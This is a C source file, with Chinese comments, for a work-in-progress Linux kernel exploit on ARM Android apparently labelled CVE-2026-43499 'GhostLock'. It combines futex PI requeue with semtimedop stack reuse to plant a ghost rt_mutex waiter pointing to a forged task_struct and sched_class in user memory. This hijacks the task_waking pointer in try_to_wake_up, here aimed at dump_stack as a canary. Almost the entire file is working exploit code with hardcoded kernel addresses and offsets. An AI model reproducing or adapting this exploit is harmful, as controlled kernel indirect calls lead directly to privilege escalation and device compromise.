/* SPDX-License-Identifier: GPL-3.0-or-later */

/* CVE-2026-43499 / GhostLock —— 金丝雀：受控间接调用（P4.48）
 *
 * 目标：证明能把 waiter 插进真实 rt_mutex，并让内核用**我们伪造的 task_struct**
 *       走 try_to_wake_up，最终调用我们填的函数指针。
 *
 * 几何（全部实测）：
 *   A 的 waiter        = A->task->stack + 0x1DF8
 *   semtimedop fast_sops = 同一地址（数组基址 = waiter + 0x00）
 *   C 的 waiter(LOCK_PI)= C->task->stack + 0x1DA8
 *
 * task_struct 偏移（dump init_task 实测，CONFIG_SMP=y）：
 *   state 0x00 | stack 0x04 | on_cpu 0x18 | on_rq 0x1C | prio 0x20
 *   sched_class 0x30 | pi_lock 0x3A0 | pi_blocked_on 0x3AC
 *
 * sched_class 槽位 —— P4.51 订正（此前 +0x20/+0x28 全是错的）：
 *   源码 include/linux/sched.h:1127，与 dump idle_sched_class(c0701f4c) 实测逐槽对齐：
 *     +0x00 next              +0x04 enqueue_task        +0x08 dequeue_task
 *     +0x0C yield_task        +0x10 yield_to_task       +0x14 check_preempt_curr
 *     +0x18 pick_next_task    +0x1C put_prev_task       +0x20 select_task_rq
 *     +0x24 pre_schedule      +0x28 post_schedule       +0x2C task_waking   ★
 *     +0x30 task_woken        +0x34 set_cpus_allowed    +0x38 rq_online
 *     +0x3C rq_offline        +0x40 set_curr_task       +0x44 task_tick
 *     +0x48 task_fork         +0x4C switched_from       +0x50 switched_to
 *     +0x54 prio_changed      +0x58 get_rr_interval
 *   反汇编 try_to_wake_up 给出的两个调用点（决定性证据）：
 *     c0064524: ldr r2, [r3, #44] @ 0x2c ; c0064530: mov r0, r8 ; c0064534: blx r2
 *         → task_waking(p)，实参只有 p      ← 本次要劫持的目标
 *     c0064538: ldr r3, [r8, #48] @ 0x30 ; c006453c: ldr r3, [r3, #32]
 *     c006454c: blx r3  (r0=p, r1=16, r2=wake_flags)
 *         → select_task_rq(p, SD_BALANCE_WAKE, wake_flags)
 *   即 P4.50 那次 dump_stack 实际打的是 **select_task_rq**（+0x20），不是 task_waking。
 *
 * try_to_wake_up 顺序：
 *   lock(&p->pi_lock) → p->state & TASK_NORMAL → task_cpu(p) → p->on_rq?
 *   → p->on_cpu? → p->state = TASK_WAKING → p->sched_class->task_waking(p) ★
 *   → select_task_rq(...) → task_cpu(p)!=cpu? set_task_cpu → rq lock
 *   → ttwu_do_activate → activate_task → enqueue_task → ttwu_do_wakeup
 *     (check_preempt_curr → p->state = TASK_RUNNING → task_woken)
 *
 * 金丝雀：task_waking(+0x2C) 填 dump_stack(c06efe6c)。它忽略参数、只打印。
 *   其余槽位照抄 idle_sched_class，使整条 try_to_wake_up 走完而不崩：
 *     select_task_rq_idle = return task_cpu(p) —— 我们 U_TI+TI_CPU=0，
 *       与 task_cpu(p) 相等 ⇒ 跳过 set_task_cpu，不会去索引 per_cpu(runqueues, cpu)。
 *     idle 没有 enqueue_task（+0x04 = 0），故用 set_curr_task_idle(空函数) 顶替，
 *       签名 (rq) 而调用点传 (rq,p,flags)，多出的实参走 r1/r2 被忽略，无害。
 *
 * 用法：/data/local/tmp/ktool root /data/local/tmp/sem_canary
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/types.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sched.h>

#ifndef SYS_syslog
#define SYS_syslog 103
#endif
#define SYSLOG_ACTION_READ_ALL	3

#define FUTEX_WAIT_REQUEUE_PI	11
#define FUTEX_CMP_REQUEUE_PI	12
#define FUTEX_LOCK_PI		6
#define FUTEX_UNLOCK_PI		7

#define SEMOPS		32
#define W_STACK_OFF	0x1DF8u		/* A: WAIT_REQUEUE_PI 路径 */

/* 用户页 0x8000..0xFFFF */
#define U_TASK		0x00009000u	/* fake task_struct（需 0x3B0） */
#define U_CLASS		0x0000A000u	/* fake sched_class */
#define U_TI		0x0000B000u	/* fake thread_info */
#define U_PLIST_PREV	0x0000C000u	/* prio_list.prev 指向这里 */
#define U_PLIST_NEXT	0x0000D000u	/* prio_list.next 指向这里 */
#define U_NLIST_PREV	0x0000E000u	/* node_list.prev 指向这里 */

#define DUMP_STACK	0xc06efe6cu

/* idle_sched_class 实测槽位（PC 侧 `ktool dump c0701f4c 96`，little-endian 还原）。
 * 用它们当基底：全是真实、无副作用的内核函数，唯一被替换的是 task_waking。 */
#define ID_NOP		0xc0066878u	/* set_curr_task_idle —— 空函数（借作 enqueue_task 等） */
#define ID_CHECK_PREEMPT 0xc00668e4u	/* check_preempt_curr_idle：resched_task(rq->idle) */
#define ID_PICK_NEXT	0xc00668bcu	/* pick_next_task_idle */
#define ID_PUT_PREV	0xc0066858u	/* put_prev_task_idle */
#define ID_SELECT_RQ	0xc0066840u	/* select_task_rq_idle：return task_cpu(p) ★ */
#define ID_TASK_TICK	0xc0066868u	/* task_tick_idle */
#define ID_SWITCHED_TO	0xc00668acu	/* switched_to_idle */
#define ID_PRIO_CHANGED	0xc006689cu	/* prio_changed_idle */
#define ID_GET_RR	0xc0066888u	/* get_rr_interval_idle */

/* task_struct 偏移（实测） */
#define T_STATE		0x00
#define T_STACK		0x04
#define T_ON_CPU	0x18
#define T_ON_RQ		0x1C
#define T_SCHED_CLASS	0x30
#define T_PI_LOCK	0x3A0
#define TI_CPU		0x0C		/* ARM thread_info.cpu */

static uint32_t u1, u2, u3, u4, u5;

static volatile int a_started, b_locked_u2, c_started, c_blocked, t_done;
static volatile int a_tid, c_tid;
static volatile int a_ret = 999, a_err, c_ret = 999, c_err;
static volatile int t_ret = 999, t_err, sem_ret = 999, sem_err;
static volatile int req_ret = 999, req_err;

static int g_semid = -1;
static int g_sig[2], g_ack[2];
static struct sembuf sops[SEMOPS];
static FILE *lg;
static char *g_kbuf;

static uint32_t g_a_stack;		/* A 的内核栈基 */
static uint32_t g_waiter;		/* A 的 waiter = stack + 0x1DF8 */
static uint32_t g_pmtx;			/* C 阻塞的那个 rt_mutex */
static void *g_fnode;			/* 64KB 对齐页，放 entry_node */

static void logf_(const char *fmt, ...)
{
	va_list ap;
	char buf[512];
	int n;

	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof buf, fmt, ap);
	va_end(ap);
	if (lg) { fwrite(buf, 1, n, lg); fflush(lg); fsync(fileno(lg)); }
	write(1, buf, n);
}

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
		 uint32_t *u2p, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2p, val3);
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s); CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

static long klog_read(void)
{
	long n = syscall(SYS_syslog, SYSLOG_ACTION_READ_ALL, g_kbuf, (1 << 20) - 1);

	if (n <= 0) return -1;
	g_kbuf[n] = 0;
	return n;
}

static int dmesg_hex(const char *key, uint32_t *out)
{
	char *p, *last = NULL;
	size_t kl = strlen(key);

	if (klog_read() < 0) return -1;
	p = g_kbuf;
	while ((p = strstr(p, key)) != NULL) { last = p; p++; }
	if (!last) return -1;
	last += kl;
	return (sscanf(last, "%x", out) == 1) ? 0 : -1;
}

static int dmesg_kread_val(uint32_t addr, uint32_t *out)
{
	char key[40], *p, *last = NULL;
	size_t kl;

	snprintf(key, sizeof key, "ktool:   %08x: ", addr);
	kl = strlen(key);
	if (klog_read() < 0) return -1;
	p = g_kbuf;
	while ((p = strstr(p, key)) != NULL) { last = p; p++; }
	if (!last) return -1;
	last += kl;
	return (sscanf(last, "%x", out) == 1) ? 0 : -1;
}

static int kt_write(const char *cmd)
{
	int fd = open("/dev/ktool", O_WRONLY);
	int n = (int)strlen(cmd), w;

	if (fd < 0) { logf_("[!] open errno=%d\n", errno); return -1; }
	w = (int)write(fd, cmd, n);
	close(fd);
	if (w != n) { logf_("[!] write '%s' -> %d/%d errno=%d\n", cmd, w, n, errno); return -1; }
	return 0;
}

static int kread(uint32_t addr, int len)
{
	char cmd[64];
	snprintf(cmd, sizeof cmd, "kread %x %d", addr, len);
	return kt_write(cmd);
}

static int ask_stack(int tid, uint32_t *st)
{
	char cmd[64];
	snprintf(cmd, sizeof cmd, "waiter %d", tid);
	if (kt_write(cmd) != 0) return -1;
	usleep(80000);
	return dmesg_hex("ktool:   task->stack=", st);
}

/* ---- 铺 fake 内存 ---- */
static void build_fake_mem(void)
{
	uint8_t *t = (uint8_t *)(uintptr_t)U_TASK;
	uint8_t *c = (uint8_t *)(uintptr_t)U_CLASS;
	uint8_t *ti = (uint8_t *)(uintptr_t)U_TI;

	memset(t, 0, 0x400);
	*(uint32_t *)(t + T_STATE)	= 1;		/* TASK_INTERRUPTIBLE */
	*(uint32_t *)(t + T_STACK)	= U_TI;		/* 假 thread_info */
	*(uint32_t *)(t + T_ON_CPU)	= 0;
	*(uint32_t *)(t + T_ON_RQ)	= 0;
	*(uint32_t *)(t + T_SCHED_CLASS) = U_CLASS;
	*(uint32_t *)(t + T_PI_LOCK)	= 0;

	/* P4.50：内核走 rt_mutex wait_list 找到 ghost waiter，取 waiter->task
	 * （= 本假 task）当 owner，然后 futex_lock_pi_atomic 内联段执行：
	 *     list_add(&pi_state->list, &task->pi_state_list);   // task+0x3E0
	 *     next->prev = &pi_state->list;   ← next 为 0 时当场空指针写（上轮崩点）
	 *     pi_state->owner = task;
	 * 基准（system_server task=0xe601f2c0 实测）：
	 *   +0x08 usage=2 | +0x3A0 pi_lock | +0x3A4/+0x3A8 pi_waiters.node_list 自环
	 *   +0x3AC pi_blocked_on=NULL | +0x3E0/+0x3E4 pi_state_list 自环
	 * 照抄这三处自环，list_add 的四步写全部落在假页内。
	 * usage 必须给正数：get/put_task_struct 成对出现，若从 0 开始，
	 * put 后 refcount 归零会走 __put_task_struct -> free_task_struct 释放用户页。 */
	*(uint32_t *)(t + 0x08)		= 0x100;	/* usage */
	*(uint32_t *)(t + 0x3A4)	= U_TASK + 0x3A4;	/* pi_waiters.node_list.next */
	*(uint32_t *)(t + 0x3A8)	= U_TASK + 0x3A4;	/* pi_waiters.node_list.prev */
	*(uint32_t *)(t + 0x3AC)	= 0;			/* pi_blocked_on = NULL */
	*(uint32_t *)(t + 0x3E0)	= U_TASK + 0x3E0;	/* pi_state_list.next = self */
	*(uint32_t *)(t + 0x3E4)	= U_TASK + 0x3E0;	/* pi_state_list.prev = self */

	/* cpus_allowed（task+0x194，反汇编 c0064550: add r3, r8, #404 证实）。
	 * try_to_wake_up 在拿到 select_task_rq 的返回值后做
	 * cpumask_test_cpu(cpu, &p->cpus_allowed)，不成立就跳 fallback 分支
	 * （c0064578: beq 0xc00646f0）。填 bit0..3 = CPU0..3 全允许，走正常路径。 */
	*(uint32_t *)(t + 0x194)	= 0xFu;

	memset(c, 0, 0x60);
	/*
	 * P4.51：以 idle_sched_class 实测槽位为基底，只把 task_waking(+0x2C) 换成
	 * dump_stack。几何证据见文件头注释，要点：
	 *   - +0x20 select_task_rq 用真实的 idle 版本：return task_cpu(p)。
	 *     假 thread_info 全 0 ⇒ 返回值 0，与 task_cpu(p) 相等
	 *     （c0064598: ldr r3,[r8,#4] → c006459c: ldr r3,[r3,#20] → c00645a0: cmp r9,r3）
	 *     ⇒ beq 跳过 set_task_cpu，不会拿垃圾 cpu 去索引 per_cpu(runqueues, cpu)。
	 *     注：反汇编显示 cpu 读自 thread_info+0x14，而 TI_CPU 宏记的是 0x0C；
	 *     因整页 memset 为 0，两个偏移读出来都是 0，不受影响。
	 *   - +0x04 enqueue_task：idle 根本没有该槽（实测 +0x04 = 0），照抄会跳 0，
	 *     这正是 P4.50 崩在 enqueue_task+0x6c 的原因。用 ID_NOP
	 *     （= set_curr_task_idle，空函数）顶替；签名 (rq) 而调用点传
	 *     (rq, p, flags)，多余实参走 r1/r2 被忽略，无害。
	 *   - +0x08 dequeue_task 不照抄 idle 的真实版本：dequeue_task_idle 内部会
	 *     raw_spin_unlock_irq(&rq->lock)，在这里调用等于把别人持有的锁放掉。
	 *     同样用 ID_NOP。
	 *   - 其余槽照抄 idle 的真实函数，均为无副作用实现。
	 */
	*(uint32_t *)(c + 0x04) = ID_NOP;		/* enqueue_task（idle 缺槽，用空函数） */
	*(uint32_t *)(c + 0x08) = ID_NOP;		/* dequeue_task（不用 idle 版，它会 unlock） */
	*(uint32_t *)(c + 0x0C) = ID_NOP;		/* yield_task */
	*(uint32_t *)(c + 0x10) = ID_NOP;		/* yield_to_task */
	*(uint32_t *)(c + 0x14) = ID_CHECK_PREEMPT;	/* check_preempt_curr */
	*(uint32_t *)(c + 0x18) = ID_PICK_NEXT;		/* pick_next_task */
	*(uint32_t *)(c + 0x1C) = ID_PUT_PREV;		/* put_prev_task */
	*(uint32_t *)(c + 0x20) = ID_SELECT_RQ;		/* ★ select_task_rq: return task_cpu(p) */
	*(uint32_t *)(c + 0x24) = ID_NOP;		/* pre_schedule */
	*(uint32_t *)(c + 0x28) = ID_NOP;		/* post_schedule */
	*(uint32_t *)(c + 0x2C) = DUMP_STACK;		/* ★★ task_waking(p) */
	*(uint32_t *)(c + 0x30) = ID_NOP;		/* task_woken */
	*(uint32_t *)(c + 0x34) = ID_NOP;		/* set_cpus_allowed */
	*(uint32_t *)(c + 0x38) = ID_NOP;		/* rq_online */
	*(uint32_t *)(c + 0x3C) = ID_NOP;		/* rq_offline */
	*(uint32_t *)(c + 0x40) = ID_NOP;		/* set_curr_task */
	*(uint32_t *)(c + 0x44) = ID_TASK_TICK;		/* task_tick */
	*(uint32_t *)(c + 0x48) = ID_NOP;		/* task_fork */
	*(uint32_t *)(c + 0x4C) = ID_NOP;		/* switched_from */
	*(uint32_t *)(c + 0x50) = ID_SWITCHED_TO;	/* switched_to */
	*(uint32_t *)(c + 0x54) = ID_PRIO_CHANGED;	/* prio_changed */
	*(uint32_t *)(c + 0x58) = ID_GET_RR;		/* get_rr_interval */

	memset(ti, 0, 0x40);
	*(uint32_t *)(ti + TI_CPU) = 0;

	__sync_synchronize();
	logf_("[F] fake task=%#x class=%#x ti=%#x cpus_allowed=%#x\n",
	      U_TASK, U_CLASS, U_TI, *(uint32_t *)(t + 0x194));
	logf_("[F] sched_class: task_waking(+0x2C)=%#x  select_task_rq(+0x20)=%#x\n",
	      *(uint32_t *)(c + 0x2C), *(uint32_t *)(c + 0x20));
}

/* semtimedop 映射：数组基址 = fast_sops（= g_waiter）
 *
 * P4.50：实测同一块栈上有两个 rt_mutex_waiter 的 plist_node 会被走到：
 *   #1 @ g_waiter+0x00 —— futex WAIT_REQUEUE_PI 那个 waiter，
 *      rt_mutex_adjust_prio_chain+0x1ac 调 plist_del(node=g_waiter)（r4 实证）
 *   #2 @ g_waiter+0x14 —— semtimedop 造出来的 waiter，
 *      rt_mutex_unlock 调 plist_del(node=g_waiter+0x14)（r4 实证），
 *      lock@+0x28 / task@+0x2C 内核确实取到过 0xd44222c8 / 0x9000
 * 两者不重叠（#1 占 0x00..0x14，#2 占 0x14..0x28，lock/task 在 0x28/0x2C）。
 *
 * struct sembuf 6 字节（sem_num@0, sem_op@2, sem_flg@4），sem_num 恒 0（nsems=1）。
 * 每个 32 位字段的哪一半受 sem_num 制约，决定可选地址：
 *   高16来自 sem_num ⇒ 值必须 < 0x10000（用 0x8000/0xC000/0xE000/0xF000 低页）
 *   低16来自 sem_num ⇒ 值必须 64KB 对齐（用 g_fnode 系对齐页）
 *   两半都来自 sem_op/sem_flg ⇒ 任意
 * list_del 的 DEBUG 校验要求 prev->next==entry 且 next->prev==entry，
 * 所以每个 stub 页只需在 +0/+4 写上对应 entry 地址即可。
 */
static void build_sops_semt(uint32_t lock, uint32_t task)
{
	uint32_t a1 = (uint32_t)(uintptr_t)g_fnode;
	uint32_t a2 = a1 + 0x10000;
	uint32_t a3 = a1 + 0x20000;
	int i;

	memset(sops, 0, sizeof sops);
	for (i = 0; i < SEMOPS; i++)
		sops[i].sem_num = 0;
	sops[0].sem_op = -1;		/* 阻塞 ⇒ semtimedop 挂起；顺带 prio#1 = 0xffff0000 */

	/* ---- #1 plist_node @ +0x00 ---- */
	/* prio(+0x00) 由 sops[0].sem_op=-1 得 0xffff0000（最高优先级）*/
	/* prio_list.next(+0x04) = sem_flg | sem_num<<16 → 低页 0x8000 */
	sops[0].sem_flg = (short)0x8000;
	/* prio_list.prev(+0x08) = sem_op | sem_flg<<16 → 同页 0x8000 */
	sops[1].sem_op  = (short)0x8000;
	/* node_list.next(+0x0C) = sem_num(0) | sem_op<<16 → 64KB 对齐 a1 */
	sops[2].sem_op = (short)((a1 >> 16) & 0xffff);
	/* node_list.prev(+0x10) = sem_flg | sem_num<<16 → 低页 0xC000 */
	sops[2].sem_flg = (short)0xC000;

	/* ---- #2 plist_node @ +0x14 ---- */
	/* prio(+0x14) = sem_op | sem_flg<<16 → 0（足以压过 C 的 120）*/
	/* prio_list.next(+0x18) = sem_num(0) | sem_op<<16 → 64KB 对齐 a2 */
	sops[4].sem_op = (short)((a2 >> 16) & 0xffff);
	/* prio_list.prev(+0x1C) = sem_flg | sem_num<<16 → 低页 0xE000 */
	sops[4].sem_flg = (short)0xE000;
	/* node_list.next(+0x20) = sem_op | sem_flg<<16 → 低页 0xF000 */
	sops[5].sem_op = (short)0xF000;
	/* node_list.prev(+0x24) = sem_num(0) | sem_op<<16 → 64KB 对齐 a3 */
	sops[6].sem_op = (short)((a3 >> 16) & 0xffff);

	/* task(+0x28) = sops[6].sem_flg | sops[7].sem_num(0)<<16 */
	sops[6].sem_flg = (short)(task & 0xffff);

	/* lock(+0x2C) = sops[7].sem_op | sops[7].sem_flg<<16 */
	sops[7].sem_op  = (short)(lock & 0xffff);
	sops[7].sem_flg = (short)((lock >> 16) & 0xffff);
}

/* 填 list_del 检查要用的用户页（P4.50：两个 plist_node 各一套 stub） */
static void fill_user(uint32_t waiter)
{
	uint32_t e_prio1 = waiter + 0x04;	/* #1 &node->prio_list */
	uint32_t e_node1 = waiter + 0x0C;	/* #1 &node->node_list */
	uint32_t e_prio2 = waiter + 0x18;	/* #2 &node->prio_list */
	uint32_t e_node2 = waiter + 0x20;	/* #2 &node->node_list */
	uint32_t a1 = (uint32_t)(uintptr_t)g_fnode;
	uint32_t a2 = a1 + 0x10000;
	uint32_t a3 = a1 + 0x20000;

	/* #1 prio_list：next=prev=0x8000 */
	*(uint32_t *)(uintptr_t)0x8000 = e_prio1;
	*(uint32_t *)(uintptr_t)(0x8000 + 4) = e_prio1;
	/* #1 node_list：next=a1（64KB 对齐），prev=0xC000 */
	*(uint32_t *)(uintptr_t)(a1 + 4) = e_node1;
	*(uint32_t *)(uintptr_t)0xC000 = e_node1;
	/* #2 prio_list：next=a2，prev=0xE000 */
	*(uint32_t *)(uintptr_t)(a2 + 4) = e_prio2;
	*(uint32_t *)(uintptr_t)0xE000 = e_prio2;
	/* #2 node_list：next=0xF000，prev=a3 */
	*(uint32_t *)(uintptr_t)(0xF000 + 4) = e_node2;
	*(uint32_t *)(uintptr_t)a3 = e_node2;
	/* 重排分支：next = node_list.next - 0x0C，读 next->prio 必须 < -65536 */
	*(uint32_t *)(uintptr_t)(a1 - 0x0C) = 0x80000000u;

	__sync_synchronize();
	logf_("[U] e_prio1=%#x e_node1=%#x e_prio2=%#x e_node2=%#x fnode=%p\n",
	      e_prio1, e_node1, e_prio2, e_node2, g_fnode);
}

/* A：futex 造 waiter → 等 main 泄漏 → semtimedop 阻塞 */
static void *thread_a(void *arg)
{
	struct timespec ts;
	char c = 'x';
	int r;

	(void)arg;
	pin_cpu(0);
	a_tid = syscall(SYS_gettid);

	futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	a_started = 1;
	__sync_synchronize();

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += 2; ts.tv_nsec += 300 * 1000 * 1000;
	while (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }

	r = futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);
	a_ret = r; a_err = errno;
	write(g_sig[1], &c, 1);

	if (read(g_ack[0], &c, 1) != 1) {
		logf_("[A] ack fail errno=%d\n", errno);
		return NULL;
	}

	{
		struct timespec to;
		to.tv_sec = 600; to.tv_nsec = 0;
		sem_ret = (int)syscall(SYS_semtimedop, g_semid, sops, SEMOPS, &to);
		sem_err = errno;
	}
	for (;;) __sync_synchronize();
	return NULL;
}

static void *thread_b(void *arg)
{
	(void)arg;
	pin_cpu(1);
	nice(19);
	futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	b_locked_u2 = 1;
	__sync_synchronize();
	futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	return NULL;
}

/* C：对 u5 做 LOCK_PI 而阻塞 —— 制造"有等待者的真实 rt_mutex" */
static void *thread_c(void *arg)
{
	(void)arg;
	pin_cpu(1);
	nice(19);
	c_tid = syscall(SYS_gettid);
	c_started = 1;
	__sync_synchronize();
	c_ret = futex(&u5, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	c_err = errno;
	c_blocked = 1;
	__sync_synchronize();
	return NULL;
}

/* T：锁 u4（A 持有）→ 触发链走读 A->pi_blocked_on */
static void *thread_t(void *arg)
{
	(void)arg;
	pin_cpu(2);
	t_ret = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	t_err = errno;
	t_done = 1;
	__sync_synchronize();
	return NULL;
}

int main(void)
{
	char c;
	pthread_t ta, tb, tc, tt;
	int i;
	void *pg;

	write(2, "BOOT\n", 5);		/* P4.50 最早期探针 */
	setvbuf(stdout, NULL, _IONBF, 0);
	lg = fopen("/data/local/tmp/cn.log", "w");

	if (pipe(g_sig) != 0 || pipe(g_ack) != 0) { logf_("[!] pipe\n"); return 1; }
	g_kbuf = malloc(1 << 20);
	if (!g_kbuf) return 1;

	/* 用户页 0x8000..0xFFFF */
	pg = mmap((void *)0x8000, 0x8000, PROT_READ | PROT_WRITE,
		  MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (pg == MAP_FAILED || (uintptr_t)pg != 0x8000) {
		logf_("[!] mmap 0x8000 fail errno=%d\n", errno);
		return 1;
	}
	memset(pg, 0, 0x8000);

	/* fake_node：P4.50 需要三个 64KB 对齐页（a1/a2/a3 = fnode/+0x10000/+0x20000）
	 * 分别当 #1/#2 的 node_list/prio_list 的 64KB 对齐 stub。
	 * 必须给高位 MAP_FIXED 提示：无提示的 0x40000 映射会被内核选到低空隙，
	 * 盖住 text（0x10000 起）当场 SEGV —— P4.48 踩过同样的坑。
	 * 从 0x4FFF0000 起映射 0x50000，令 g_fnode=0x50000000（64KB 对齐），
	 * 前面留一页供 plist 重排分支读 next->prio（a1-0x0C）。 */
	pg = mmap((void *)0x4FFF0000, 0x50000, PROT_READ | PROT_WRITE,
		  MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (pg == MAP_FAILED || (uintptr_t)pg != 0x4FFF0000) {
		logf_("[!] mmap fnode fail %p errno=%d\n", pg, errno);
		return 1;
	}
	g_fnode = (void *)0x50000000;
	memset((char *)0x4FFF0000, 0, 0x50000);

	g_semid = semget(IPC_PRIVATE, 1, 0666 | IPC_CREAT);
	if (g_semid < 0) { logf_("[!] semget errno=%d\n", errno); return 1; }
	semctl(g_semid, 0, SETVAL, 0);

	build_fake_mem();

	logf_("=== sem_canary pid=%d semid=%d fnode=%p ===\n",
	      getpid(), g_semid, g_fnode);

	/* ---- 1) 主线程持 u5，C 阻塞上去 ---- */
	futex(&u5, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	pthread_create(&tc, NULL, thread_c, NULL);
	while (!c_started) usleep(1000);
	usleep(300000);

	/* ---- 2) 泄漏 C 的 waiter->lock（真实 pi_mutex） ---- */
	logf_("[D] uid=%d/%d/%d euid=%d\n", getuid(), getgid(), geteuid(), geteuid());
	{
		uint32_t cst = 0, cpbo = 0;

		if (ask_stack((uint32_t)c_tid, &cst) != 0) {
			logf_("[!] C stack fail\n"); return 2;
		}
		kread(cst + 0x1DA8, 0x40);
		usleep(80000);
		if (dmesg_kread_val(cst + 0x1DA8 + 0x2C, &g_pmtx) != 0) {
			logf_("[!] C waiter->lock fail\n"); return 2;
		}
		logf_("[C] stack=%#x pi_blocked_on=%#x pi_mutex=%#x\n",
		      cst, cst + 0x1DA8, g_pmtx);
	}

	/* ---- 3) A 走 futex 造 waiter ---- */
	pthread_create(&ta, NULL, thread_a, NULL);
	while (!a_started) usleep(1000);
	usleep(150000);
	pthread_create(&tb, NULL, thread_b, NULL);
	while (!b_locked_u2) usleep(1000);
	usleep(250000);

	req_ret = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
	req_err = errno;
	logf_("[C'] CMP_REQUEUE_PI=%d errno=%d %s\n", req_ret, req_err,
	      (req_ret < 0 && req_err == 35) ? "*** EDEADLK ***" : "(?)");

	if (read(g_sig[0], &c, 1) != 1) { logf_("[!] sig fail\n"); return 1; }
	usleep(120000);

	/* ---- 4) 泄漏 A 的 stack，填用户页 ---- */
	if (ask_stack((uint32_t)a_tid, &g_a_stack) != 0) {
		logf_("[!] A stack fail\n"); return 2;
	}
	g_waiter = g_a_stack + W_STACK_OFF;
	fill_user(g_waiter);

	/* ---- 5) 放 A 去 semtimedop（lock=真实 pi_mutex，task=fake） ---- */
	build_sops_semt(g_pmtx, U_TASK);
	write(g_ack[1], "y", 1);
	usleep(350000);

	logf_("[A] futex=%d/%d waiter=%#x lock=%#x task=%#x\n",
	      a_ret, a_err, g_waiter, g_pmtx, U_TASK);

	/* ---- 6) T 触发链走 ---- */
	logf_("[T] before: pmtx.wait_list.next=%08x\n", 0);
	pthread_create(&tt, NULL, thread_t, NULL);
	for (i = 0; i < 60 && !t_done; i++) usleep(50000);
	logf_("[T] done=%d ret=%d err=%d\n", t_done, t_ret, t_err);

	/* ---- 7) 释放 u5 → unlock 选 top waiter → wake_up_process(fake task) ---- */
	logf_("[U] releasing u5 (-> rt_mutex_slowunlock -> mark_wakeup_next_waiter)\n");
	fflush(stdout);
	if (lg) { fflush(lg); fsync(fileno(lg)); }

	futex(&u5, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
	logf_("[U] unlock returned errno=%d\n", errno);

	/* 走完这行说明没崩；金丝雀看 dmesg */
	sleep(1);
	logf_("*** RESULT: 检查 dmesg 有没有 dump_stack 的输出 ***\n");
	return 0;
}
